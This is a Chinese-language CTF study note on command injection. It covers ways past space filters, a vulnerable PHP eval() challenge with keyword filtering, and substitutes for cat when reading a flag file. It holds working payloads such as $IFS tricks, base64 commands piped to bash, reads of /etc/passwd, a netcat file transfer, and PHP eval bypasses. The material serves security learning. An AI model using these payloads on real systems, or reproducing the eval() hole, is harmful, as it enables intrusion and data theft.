## Linux 命令注入：空格过滤绕过

### 为什么过滤空格

在 CTF 命令注入题目中，空格是最常被过滤的字符之一，因为绝大多数 Linux 命令都需要用空格分隔参数。过滤空格可以让攻击者无法正常拼接命令。

### 绕过方法

**1）`$IFS` 替代空格**

`$IFS` 是 Linux 内部字段分隔符（Internal Field Separator），默认值是空格。

```bash
cat$IFS/etc/passwd
# 等价于: cat /etc/passwd
```

**2）`$IFS$9`（更安全的写法）**

```bash
cat$IFS$9/etc/passwd
```

> `$9` 代表第 9 个位置参数，如果没传参就是空串。用 `$9` 是为了防止 `$IFS` 和后面的字符串粘连成一个新的变量名（如 `$IFS/etc` 会被解析为变量）。

**3）花括号 `{}`**

```bash
{cat,/etc/passwd}
```

花括号展开后每个元素之间自动用空格分隔。

**4）Tab 制表符 `%09`**

```bash
cat%09/etc/passwd          # URL 编码中 Tab = %09
```

**5）重定向符号 `<`**

```bash
cat</etc/passwd
# < 本身就会分隔命令和参数，不需要空格
```

**6）`$()` 空命令替换**

```bash
cat$()/etc/passwd
# $() 执行空命令，返回空串，相当于 cat /etc/passwd
```

**7）变量拼接**

```bash
a=c;b=a;c=t;${a}${b}${c} /etc/passwd
# 拼出来就是: cat /etc/passwd
```

**8）编码绕过**

```bash
# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
# 解码后: cat /etc/passwd

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
```

### 速查表

| 方法 | 示例 | 原理 |
|------|------|------|
| `$IFS` | `cat$IFS/etc/passwd` | 内部分隔符，默认是空格 |
| `$IFS$9` | `cat$IFS$9/etc/passwd` | 防止和后面字符串粘连 |
| `{}` | `{cat,/etc/passwd}` | 花括号展开自动加空格 |
| Tab `%09` | `cat%09/etc/passwd` | 制表符替代空格 |
| `<` | `cat</etc/passwd` | 重定向自带分隔 |
| `$()` | `cat$()/etc/passwd` | 空命令替换返回空串 |
| 变量拼接 | `a=c;${a}t /etc/passwd` | 拆分命令名 |
| Base64 | `echo Y2F0...\|base64 -d\|bash` | 编码绕过 |

最常用的是 **`$IFS`** 和 **`$IFS$9`**，实际 CTF 中遇到的最多。

## Linux 命令注入：绕过文件过滤

![](.\images\202607070007.png)

首先是需要查看目录，找flag可能在哪里，找到后直接cat，但是flag以及php被禁用，

### 题目源码

```php
<?php 
header("content-type:text/html;charset=utf-8"); 
highlight_file(__FILE__); 
error_reporting(0); 
if(isset($_GET['cmd'])) { 
    $cmd = $_GET['cmd']; 
    if (!preg_match("/flag|system|php/i", $cmd)) { 
        eval($cmd); 
    } 
    else{ 
        echo "命令有问题哦，来黑我丫！！！"; 
    } 
}
```

### 分析过滤规则

`preg_match("/flag|system|php/i", $cmd)` 过滤了三个关键词（`/i` 不区分大小写）：

| 被禁关键词 | 影响 |
|-----------|------|
| `flag` | 不能直接写 flag，无法 `cat /flag` |
| `system` | 不能用 `system()` 执行命令 |
| `php` | 不能用 php 相关函数名 |

但输入经过检查后直接传入 `eval()`，所以仍然可以执行任意 PHP 代码。

### 绕过方法一：用其他命令执行函数替代 `system()`

`system` 被禁，但这些函数没被禁：

| 替代函数 | 用法 |
|---------|------|
| `passthru()` | `passthru("ls");` |
| `exec()` | `exec("ls");` |
| `shell_exec()` | `shell_exec("ls");` |
| `popen()` | `popen("ls","r");` |
| 反引号 | `echo \`ls\`;`（反引号会自动调用 shell_exec） |

### 绕过方法二：绕过 `flag` 关键字

**1）通配符（最简单）**

```bash
cat /f*      # * 匹配任意字符
cat /f??     # ? 匹配单个字符
cat /fla*
```

**2）字符串拼接**

```php
cmd=system("cat /f"."lag");
# eval 中执行: system("cat /flag");
```

**3）变量拼接**

```php
cmd=$a="cat /f";$b="lag";system($a.$b);
```

**4）Base64 编码**

```php
cmd=system(base64_decode("Y2F0IC9mbGFn"));
// 解码后: cat /flag
```

**5）chr() 函数逐字符构造**

```php
cmd=$a=chr(102).chr(108).chr(97).chr(103);  // "flag"
passthru("cat /".$a);
```

**6）引号穿插（PHP 会忽略引号）**

```php
cmd=passthru("cat /fl''ag");
cmd=passthru("cat /fl\"ag");
```

**7）取反绕过**

```php
# 对 "flag" 取反得到不可见字符，再取反还原
cmd=passthru("cat /".~"\x8b\x95\x9e\x98");
```

### 绕过方法三：绕过 `php` 关键字

```php
# 变量拼接
cmd=$a="ph";$b="pinfo";$a.$b();
```

### 实战组合

```php
# 最简单解法：passthru + 通配符
cmd=passthru("cat /f*");

# 反引号 + 字符串拼接
cmd=echo `cat /f"."lag`;

# exec + Base64
cmd=exec(base64_decode("Y2F0IC9mbGFn"));

# 变量拼接
cmd=$a="cat /f";$b="lag";passthru($a.$b);

# chr() 构造
cmd=$c=chr(99).chr(97).chr(116);  // "cat"
$f=chr(102).chr(108).chr(97).chr(103);  // "flag"
passthru($c." /".$f);
```

### 速查表

| 被禁 | 替代方案 |
|------|---------|
| `system` | `passthru`、`exec`、`shell_exec`、`popen`、反引号 `` ` `` |
| `flag` | 通配符 `f*`、字符串拼接 `"fl"."ag"`、变量拼接、Base64、`chr()` |
| `php` | 字符串拼接、变量拼接、`chr()` 函数 |

这道题最简单的解法：`?cmd=passthru("cat /f*");`

比如：

![](.\images\202607070008.png)

![](.\images\202607070009.png)

需要注意的事情是，? 在 URL 中是查询参数分隔符，如果不放在函数里，那么会直接被截断，比如命令：

```shell
?cmd=$a=fla;$b=g.ph?p;cat%20$a$b*
```

在浏览器的URL中，```?p;cat%20$a$b*`这里?后面的都被截断，需要函数包裹

另外，eval()是代码执行函数，所以传进去的需要是一个函数，不能是一个没有被函数包裹的命令

## Linux 命令注入：绕过读取过滤

当 `cat` 等读取命令被禁用时，可以用其他命令或方法读取文件内容。

### 一、`cat` 被禁用时的替代命令

**反向读取类**

```bash
tac /flag              # 反向逐行输出（cat 倒过来）
rev /flag              # 反转每行的字符顺序
```

**分页/截取类**

```bash
head /flag             # 输出文件开头
tail /flag             # 输出文件结尾
more /flag             # 分页输出（空格翻页）
less /flag             # 分页输出
cut -c1- /flag         # 按字符截取
```

**格式转换类**

```bash
od /flag               # 八进制转储
xxd /flag              # 十六进制转储
strings /flag          # 提取可打印字符串
base64 /flag           # Base64 编码输出
```

**文本处理类**

```bash
nl /flag               # 带行号输出
sort /flag             # 排序输出
uniq /flag             # 去重输出
sed '' /flag           # 用 sed 输出（空替换=原样输出）
awk '{print}' /flag    # 用 awk 输出
paste /flag            # 粘贴输出
diff /flag /dev/null   # 用 diff 对比输出
grep '' /flag          # 用 grep 匹配所有行
tr a a < /flag         # 用 tr 做无意义替换，原样输出
wc -c < /flag          # 输出字节数（不能看内容但可以判断文件大小）
```

**网络工具类**

```bash
curl file:///flag      # 用 curl 读取本地文件
wget -qO- /flag        # 用 wget 读取
```

**复制/移动类**

```bash
cp /flag /tmp/f        # 复制到可访问目录再读取
mv /flag /tmp/f        # 移动（注意：会删除原文件）
```

**文件描述符类**

```bash
exec 3< /flag; cat <&3     # 用文件描述符绕过
while read line; do echo "$line"; done < /flag   # 逐行读取
mapfile arr < /flag; echo "${arr[@]}"             # bash 内置读取
```

### 二、`cat` 和其他命令都被禁用时

**1）用 `base64` 编码读取**

```bash
base64 /flag
# 输出 flag 的 Base64 编码，在本地解码即可
```

**2）用 `cp` 复制后下载**

```bash
cp /flag /var/www/html/f.txt   # 复制到 web 目录
# 然后浏览器访问 http://target/f.txt
```

**3）用反弹 Shell + 文件传输**

```bash
# 在目标机器上
nc -lvp 9999 < /flag

# 在本地
nc target_ip 9999 > flag
```

**4）用 `dd` 读取**

```bash
dd if=/flag
dd if=/flag bs=1 count=100    # 读取前 100 字节
```

**5）用 `tee` 重定向**

```bash
tee /tmp/f < /flag             # 读取 flag 写入 /tmp/f
```

**6）用 `script` 录制**

```bash
script -qc "cat /flag" /dev/null
```

### 三、速查表

| 被禁命令 | 替代方案 |
|---------|---------|
| `cat` | `tac`、`nl`、`head`、`tail`、`more`、`less`、`sort`、`strings`、`od`、`xxd`、`base64`、`sed`、`awk`、`grep`、`diff`、`rev`、`dd` |
| `cat` + `tac` | `head`、`tail`、`sed`、`awk`、`grep`、`nl`、`base64`、`strings` |
| 所有读取命令 | `cp` 复制后下载、`base64` 编码、`dd`、文件描述符、反弹 Shell |
| `cat` + `空格` | `tac$IFS/flag`、`head$IFS/flag`、`base64$IFS/flag` |
| `cat` + `flag` | `tac /f*`、`head /f*`、`base64 /f*`、`strings /f*` |

最常用的是 `tac`、`head`、`tail`、`base64`、`strings`，如果都被禁了就用 `cp` 复制后下载或 `dd` 逐字节读取。
